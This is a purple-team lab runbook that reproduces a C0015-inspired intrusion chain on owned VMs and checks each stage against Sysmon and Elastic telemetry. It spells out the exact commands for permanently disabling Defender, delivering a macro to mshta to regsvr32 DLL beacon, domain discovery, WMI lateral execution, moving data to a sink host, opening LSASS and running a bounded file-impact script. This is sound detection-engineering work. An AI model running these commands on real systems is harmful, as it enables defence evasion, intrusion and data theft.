# C0015 Attack Runbook — step by step (S1 to S15)

Canonical, machine-by-machine runbook to reproduce the C0015-inspired chain on the lab.
All steps are benign surrogates on owned VMs. Read `docs/implementation-plan.md` (blueprint),
`docs/attack-chain-plan.md` (historical fidelity) and `docs/correlation-architecture.md`
(join keys) first. Supersedes the earlier phase-1-only runbook.

## Roles and machines

| Role | Machine | Notes |
|---|---|---|
| Victim / first foothold | WS01 (192.168.50.20, Win10, `C0015\duc.user`) | Word + Elastic Agent + Sysmon |
| Lateral target / file+backup | FS01 (192.168.50.30, Win10 Pro 19045) | shares Finance/IT |
| Attacker / C2 | host lab 192.168.50.1 (or Kali 192.168.50.100) | runs C2-SIM v3 + HTTP DLL server |
| Identity / telemetry | DC01 (192.168.50.10) | AD/DNS; not an attack target |
| SIEM | ELASTIC01 (Tailscale, Fleet 100.77.46.126:8220) | Elastic 9.5.3, namespace `c0015` |

## Prerequisites (once, before the first run)

1. WS01: Word installed (verify `HKLM:\...\App Paths\winword.exe`).
2. WS01 Word macros: enable VBA macros; enable "Trust access to the VBA project object model".
3. Sysmon: deploy the routine **BALANCED** profile, or the **CAPTURE** profile for bounded
   observation sessions (E7/E10 unfiltered). Files: `configs/sysmon/sysmon-c0015-balanced.xml`
   (routine) and `configs/sysmon/sysmon-c0015-capture.xml` (observation).
   ```powershell
   # from an admin PowerShell on the endpoint:
   & C:\Tools\sysmon64.exe -c C:\Tools\sysmon-c0015-balanced.xml     # routine
   # or for an observation session:
   & C:\Tools\sysmon64.exe -c C:\Tools\sysmon-c0015-capture.xml
   ```
4. Lab AV config (so the benign chain is not blocked): on WS01 and FS01, disable Defender
   real-time for the session (documented lab configuration, not evasion):
   ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   Set-MpPreference -DisableIOAVProtection $true
   ```
   Re-enable after the run; record the disable as an observable (Defender Operational 5001/5010/1151).

   **Permanent lab disable (all lab VMs, operator-chosen).** Order matters:
   ```powershell
   # 1) TAMPER PROTECTION OFF first (GUI: Windows Security > Virus & threat protection >
   #    Manage settings > Tamper Protection = Off) — otherwise Defender resets the prefs.
   # 2) Policy-level disable (survives reboot):
   New-Item -Force -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' DisableAntiSpyware 1 -Type DWord
   New-Item -Force -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' DisableRealtimeMonitoring 1 -Type DWord
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' DisableBehaviorMonitoring 1 -Type DWord
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' DisableOnAccessProtection 1 -Type DWord
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' DisableScanOnRealtimeEnable 1 -Type DWord
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' DisableIOAVProtection 1 -Type DWord
   # 3) Prefs level + cloud/scripting off:
   Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true `
     -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -DisableCloudProtection $true -MAPSReporting 0 -SubmitSamplesConsent 0
   # 4) Verify on every VM:
   Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected
   #    expect AMRunningMode=Passive/Off, RealTimeProtectionEnabled=False
   ```
   (Optional persistence if a policy refresh re-enables it: a Startup scheduled task running step 3 as SYSTEM.)
   Re-enable for hygiene after the campaign: remove the policy keys, re-enable Tamper Protection,
   `Update-MpSignature`. DC01: the campaign never touches it — disable only for uniform lab telemetry.
5. Build toolchain on the attacker host: mingw (`apt install gcc-mingw-w64-x86-64` on Kali).
6. Pull the latest repo (`git pull`); HEAD should match what you are about to run.

## Part A — S1..S3: entry, bootstrap, beacon (VERIFIED)

### Attacker / C2 host

```powershell
cd <repo>
# 1. Build the benign DLL (masqueraded as .jpg -> T1036), staged into build/out/
./payloads/packaging/build_dll.sh                      # -> c0015-comparefor.jpg + build/out/

# 2. Generate the per-run config (C2Host = this host's lab IP)
mkdir -p stage/ws01
pwsh -File payloads/packaging/make_config.ps1 -RunId RUN-<yyyymmdd>-01 -C2Host 192.168.50.1 -OutPath stage/ws01/config.ini
cp payloads/hta/bootstrap.hta payloads/beacon/c0015_beacon.ps1 stage/ws01/

# 3. Start C2-SIM (:8080) + HTTP DLL server (:8000). The script auto-kills stale listeners first.
pwsh -File payloads/packaging/launch_servers.ps1 -C2Ip 192.168.50.1 -PublishDir build/out
# verify: http://192.168.50.1:8000/c0015-comparefor.jpg -> 200
```

### WS01 (victim)

```powershell
# 4. Stage delivery files into C:\Users\Public\C0015\ (config.ini + bootstrap.hta + c0015_beacon.ps1)
powershell -ExecutionPolicy Bypass -File .\stage_ws01.ps1 -Source <folder-with-config-hta-beacon>

# 5. Build the macro-enabled document
powershell -ExecutionPolicy Bypass -File .\install_macro_docm.ps1 -MacroSource .\macro_payload.vba

# 6. Open test.docm ONCE (Enable Content). Chain: macro -> mshta -> HTA -> download DLL -> regsvr32 -> DLL -> beacon.
```

### Verify S1..S3 (session 1)

- C2-SIM log (`c2sim.log` on the C2 host) must show exactly ONE:
  `register stage=phase3 host=WS01 token=... ok=True (registered)`, followed by task/result lines.
  A duplicate open yields `ok=False (reuse:...)` (idempotent — one session per run).
- WS01 markers: `C:\Users\Public\C0015\b64-marker.txt`, `js-marker.txt`, `c0015-comparefor.jpg`,
  `dll-executed.txt` (the last one proves the DLL executed; the HTA does not write it).
- Sysmon E1 on WS01: `WINWORD -> cmd -> mshta -> regsvr32 -> powershell` ancestry; E11 for the files;
  E3 to `192.168.50.1:8000/8080`; E7 ImageLoad of the DLL only if the CAPTURE profile is loaded.

## Part B — S4: discovery (operator-driven, beacon executes on WS01)

Working style: operator stays on the C2 host and SHEPHERDS the beacon; the commands run
on WS01 (parent chain = beacon powershell PID of session 1). The C2-SIM serves the DFIR
batch once, in order, then idles on T-BEACON-SLEEP.

Prereq (critical): the deployed `config.ini` on WS01 must map ALL 8 discovery tasks.
Regenerate with the CURRENT make_config, otherwise the beacon falls back to `cmd /c ver`
(observed: RUN-20261001-01, S4 CORPUS only — see ledger). Then re-stage + reopen the docm.

On WS01 / C2 host — verify the batch ran (8 results accepted):
```powershell
# C2 host: watch register + 8 task/result lines
Get-Content c2sim.log -Tail 30
# WS01 structured evidence incl. ParentProcessGuid
powershell -ExecutionPolicy Bypass -File .\collect_ws01_evidence.ps1 -SinceMinutes 30 -OutPath C:\Users\Public\c0015-evidence.json
```
Expected WS01 E1 (parent = beacon `...3d08`): `net.exe view /all` (T1135),
`tasklist.exe /s` (T1057), `cmd->net group "domain admins" /dom` (T1069.002),
`cmd->net localgroup "administrator"` (T1069.001), `cmd->nltest /domain_trusts /all_trusts` (T1482),
`cmd->net view /all /domain` (T1018), `cmd->net view /all time` (T1124), `cmd->ping FS01` (T1018).

Ledger row: stage S4, status `VERIFIED IN REPO` (8/8) with the E1 record_ids + c2sim task results.

## Operator playbook — S5..S9 (the "hands-on" operator phase)

Working style identical to S1-S3: machine -> exact command -> input needed -> evidence to
confirm -> ledger row. Operator runs on WS01 or the C2 host as indicated; NEVER more than
what an operator can do interactively; credentials only via prompt/runas (never logged).

### S5 — found_shares artifact (on WS01)
```
Machine: WS01 (as duc.user, interactive)
Input:   run_id (RUN-<yyyymmdd>-<seq>); session 1 active
Commands:
  net view \\FS01
  Get-SmbShare | Out-File C:\ProgramData\found_shares.txt     # mirror DFIR staging path
  # structured ART-04-01 (on C2 host where the repo lives):
  python scripts/lab_tools.py artifact-new ART-04-01 <run_id> 5 6 --payload found_shares.json -o art04_01.json
Expected evidence: E1 cmd/net view on WS01; E11 found_shares.txt; ART-04-01 created (sha256 recorded)
Ledger: S5 = VERIFIED IN REPO if artifact hash + E1 exist
```
### S6 — target decision (orchestrator, on C2 host)
```
Machine: C2 host (repo present)
Input:   ART-04-01 (must be the actual file read, not hardcoded)
Command: python scripts/lab_tools.py artifact-new ART-04-02 <run_id> 6 8 --payload target-manifest.json -o art04_02.json
Decision rule: target.host = FS01 derived from ART-04-01 content (readable share) ; write selection_reason.
Expected evidence: ledger step note (orchestration); artifact ART-04-02
Ledger: S6 = VERIFIED if ART-04-02.target.host comes from ART-04-01 (provenance recorded)
```
### S7 — auth controls (WS01 -> FS01, explicit credential)
```
Machine: WS01 interactive (operator)
Input:   it.admin pre-provisioned (not logged); ART-04-02.auth.account
Run 3 control cases with net use (password via prompt, never on CLI/log):
  A denied   : net use \\FS01\IPC$ /user:C0015\duc.user *   -> expect access denied
  B allowed  : net use \\FS01\IPC$ /user:C0015\it.admin *   -> OK (this is control proof, NOT the WMI cred)
  C revoked  : use a revoked/second account -> denied
Record ART-05-01 (logon evidence bundle: S4648/S4624/4672 refs + LogonId) on C2 host.
Architecture note: an IPC$ session does NOT change the process token; S8b must re-supply
the credential explicitly (runas/CIM -Credential). ART-05-01 is EVIDENCE, not control input.
Ledger: S7 = VERIFIED when denied/allowed/denied observed (4625/4624/4672) + LogonId linked
```
### S8a — tool handoff (T1570 surrogate, on WS01)
```
Machine: WS01 interactive
Input:   staged DLL c0015_143_surrogate.dll present in C:\C0015\stage\
Command: copy C:\C0015\stage\c0015_143_surrogate.dll \\FS01\C$\C0015\
Expected evidence (FS01): S5140/S5145 (admin share), E11 TargetFilename C:\C0015\... ; hash continuity
Ledger: S8 evidence (transfer) — separate from execution; do NOT infer transfer from process run
```
### S8b — WMI remote process creation (T1047, explicit credential; on WS01)
```
Machine: WS01 interactive (operator)
Input:   ART-04-02 + explicit it.admin credential (runas prompt / Get-Credential)
Command (primary, keeps wmic telemetry):
  runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""
Fallback (telemetry differs = powershell, note PARTIAL):
  $cred = Get-Credential C0015\it.admin
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -ComputerName FS01 -Credential $cred -Arguments @{CommandLine='rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry'}
Expected evidence:
  WS01: S4648 (explicit credential) ; FS01: S4624 Type3 + S4672 + E1 wmiprvse->rundll32 + E7 ImageLoad (hash) + E11
Gate (4): process on FS01 / which identity (S4648 + S4624/4672 same LogonId) / which process (+DLL hash) / callback S9
Ledger: S8 = VERIFIED only when the 4-gate evidence set is present in the same run_id
```
### S9 — second session (143.dll surrogate; automatic after S8b trigger)
```
Machine: FS01 (DLL runs there) + C2 host writes the receipt
After S8b, the benign DLL registers phase7-session2; C2-SIM writes server-side ART-07-01.
Expected evidence: FS01 E3 -> 192.168.50.1:8080 (callback), ART-07-01 receipt artifact, FS01 E1/E7
Acceptance: server-side receipt + callback telemetry in the run - marker/DLL present is NOT sufficient.
Injection (S9b) is analysis/replay only (fixtures); never performed.
Ledger: S9 = VERIFIED only with ART-07-01 + callback in same run
```

## Part E — S10..S11: collection, staging, transfer (operator commands)

### S10 — collection and staging (session 2 on FS01)
```
Machine: FS01 (session 2 = it.admin context)
Input:   ART-07-01 receipt + ART-04-02.allowed_actions
Commands:
  # read the corpus (T1039: \\FS01\IT share for it.admin), then on the C2 host build the manifest:
  python scripts/lab_tools.py manifest-new C:\Shares\IT <run_id> -o art08_01.json
Expected evidence: FS01 S5145 (share access), E11 staging, manifest hash/bytes
Ledger: S10 = VERIFIED with S5145 + manifest matching corpus
```
### S11a / S11b — transfer to internal sink (two rounds; RDP S12 between)
```
Machine: session 2 host -> sink (192.168.50.1:8081)
Input:   ART-08-01 manifest; allowlist (hash+bytes, <=1024 single POST)
Commands (C2 host, repo):
  # POST the allowlisted corpus to the sink, then cross-check:
  python scripts/lab_tools.py receipt-check <receipt.json> <manifest.json> <allowlist.json>
Expected evidence: sink receipt ART-09-01 (r1/r2), E3 from the sender, hash continuity
Ledger: S11 = VERIFIED with 2 receipts (r1, r2) + hash chain manifest==receipt==allowlist, same run_id
Note: chunked <=512 B is DESIGN ONLY until the sink reassembles chunks.
```

## Part F — S12..S14: RDP, AnyDesk-like + LSASS study, bounded impact

### S12 — RDP (native; mirror day 2)
```
Machine: WS01 or Kali -> FS01 (it.admin)
Command: mstsc /v:FS01
Expected evidence: S4624 Type 10, S4778/4779, TerminalServices session; DET-008 to define
Ledger: S12 = VERIFIED with the RDP logon bundle
```
### S13 — AnyDesk-like + LSASS study
```
Machine: FS01; analysis/replay only for LSASS
- AnyDesk-like: install a legitimate portable app into an unusual path (C:\Users\Public\Videos\)
  and capture install/process/network telemetry.
- LSASS: a lab tool may open lsass.exe with PROCESS_QUERY_LIMITED_INFORMATION to produce E10 + access
  mask; high-rights patterns appear only in synthetic fixtures. No dump, no read, no credential.
Ledger: S13 = VERIFIED when install telemetry exists; LSASS branch = ANALYSIS/REPLAY ONLY
```
### S14 — bounded impact + restore (on FS01, manifest-driven)
```
Input:   impact manifest (allowlist root, caps, note name, extension) - generated per run
Commands (FS01 repo copy):
  powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <manifest.json> -Action Prepare
  powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <manifest.json> -Action Run
  powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <manifest.json> -Action Verify
  powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <manifest.json> -Action Rollback
  powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <manifest.json> -Action Verify
Expected evidence: high-rate E11/E2/E26 on allowlist root, note file, restore count/hash/ACL diff
Ledger: S14 = VERIFIED with restore-verify OK + no escape from the allowlist root
```

## Part G — S15: end-to-end (engineering + investigation)

Run the full chain TWICE under ONE run_id each: an engineering run (runbook visible) and an
investigation run (analyst sees only telemetry; ground truth hidden until reconstruction). Score
the analyst reconstruction against the run ledger: `python scripts/lab_tools.py score`.

Working style summary: every stage has `Machine:`, `Input:`, exact command(s), `Expected
evidence`, `Ledger` row. Operator runs interactively; credentials only via prompt/runas; no
command ever logs a password; handoff evidence is confirmed per-stage, never inferred.

## Cleanup (after each run)

```powershell
# C2 host: stop servers
pwsh -File payloads/packaging/launch_servers.ps1 -Stop
# WS01/FS01: remove chain artifacts
Remove-Item -Recurse -Force C:\Users\Public\C0015 ; Remove-Item "$env:USERPROFILE\Desktop\test.docm" -Force
# Re-enable Defender + restore routine Sysmon profile after the observation session.
```

Status: S1-S3 VERIFIED on lab (ledger RUN-20261001-01); S4 = CORPUS-only in that run (other tasks fell
back to T-NOOP due to a stale config.ini - regenerate config per Part B before the next run); S5-S15 are
operator/design steps with exact machine/command/evidence/ledger rows above; the chain is NOT end-to-end
until one continuous run carries handoff evidence for every stage under a single run_id.
